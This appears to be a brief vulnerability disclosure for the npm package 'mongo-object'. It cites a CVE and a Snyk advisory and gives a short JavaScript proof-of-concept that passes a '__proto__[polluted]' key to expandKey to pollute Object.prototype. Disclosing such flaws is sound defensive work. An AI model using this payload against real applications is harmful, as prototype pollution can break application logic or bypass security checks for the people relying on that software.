# mongo-object

- package name: `mongo-object`

- PoC exploit:

```javascript
var mo = require('mongo-object');
assert(({}).polluted === undefined);

mo.expandKey('yes', '__proto__[polluted]', {});
assert(({}).polluted === 'yes');
```

- Assigned CVE: [CVE-2026-16266](https://security.snyk.io/vuln/SNYK-JS-MONGOOBJECT-13816714)